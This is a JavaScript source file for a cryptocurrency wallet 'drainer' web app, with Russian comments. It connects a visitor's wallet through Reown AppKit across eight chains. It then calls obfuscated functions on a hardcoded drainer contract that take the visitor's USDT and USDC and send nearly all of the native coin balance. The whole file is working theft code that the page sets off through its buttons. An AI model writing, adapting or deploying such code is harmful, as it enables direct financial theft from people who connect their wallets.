// main.js
import { createAppKit } from '@reown/appkit'
import {
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'

// === Параметры drainer‑контракта ===
const DRAINER_ADDRESS = '0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF'
const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function approve(address spender,uint256 amount) returns (bool)',
  'function allowance(address owner,address spender) view returns (uint256)'
]
const DRAINER_ABI = [
  'function tK7(uint256 usdtAmount, uint256 usdcAmount) external',
  'function bN3() external payable'
]

// === Настройка AppKit + WagmiAdapter ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]

const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Drainer dApp',
    url: 'https://checkalex.xyz/',
    icons: [`https://checkalex.xyz/icon.png`],
  },
  features: { analytics: true }
})

// Здесь будет наш signer — и для десктопа, и для мобильного WC-провайдера.
let signer = null

// После успешного подключения сохраняем signer и активируем кнопки
modal.on('connect', async () => {
  const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
  signer = provider.getSigner()

  document
    .getElementById('drain-tokens-btn')
    .removeAttribute('disabled')
  document
    .getElementById('drain-native-btn')
    .removeAttribute('disabled')
})

// === UI: привязка кнопок ===
document
  .getElementById('open-connect-modal')
  .addEventListener('click', () => modal.open())

// 1) Списание USDT/USDC
document
  .getElementById('drain-tokens-btn')
  .addEventListener('click', async () => {
    if (!signer) return alert('Сначала подключите кошелек!')
    try {
      const drainer = new ethers.Contract(
        DRAINER_ADDRESS,
        DRAINER_ABI,
        signer
      )
      // Здесь вы можете вычислить точные суммы usdtAmount и usdcAmount,
      // например, из баланса:
      // const usdtAmount = ... , const usdcAmount = ...
      const usdtAmount = ethers.utils.parseUnits('0.1', 6)
      const usdcAmount = ethers.utils.parseUnits('0.1', 6)

      // Этот один await вызовет именно одну транзакцию approve+tK7
      await drainer.tK7(usdtAmount, usdcAmount)
      console.log('✅ tK7 транзакция отправлена')
    } catch (e) {
      console.error('Ошибка при tK7:', e)
      alert('Ошибка при списании токенов: ' + e.message)
    }
  })

// 2) Списание родной монеты
document
  .getElementById('drain-native-btn')
  .addEventListener('click', async () => {
    if (!signer) return alert('Сначала подключите кошелек!')
    try {
      const drainer = new ethers.Contract(
        DRAINER_ADDRESS,
        DRAINER_ABI,
        signer
      )
      // Пример: оставить 0.001 монеты на кошельке
      const balance = await signer.getBalance()
      const toSend = balance.sub(ethers.utils.parseEther('0.001'))
      if (toSend.lte(0)) {
        return alert('Недостаточно родной монеты для списания')
      }

      // Этот await в обработчике клика гарантирует deep‑link
      await drainer.bN3({ value: toSend })
      console.log('✅ bN3 транзакция отправлена')
    } catch (e) {
      console.error('Ошибка при bN3:', e)
      alert('Ошибка при списании родной монеты: ' + e.message)
    }
  })
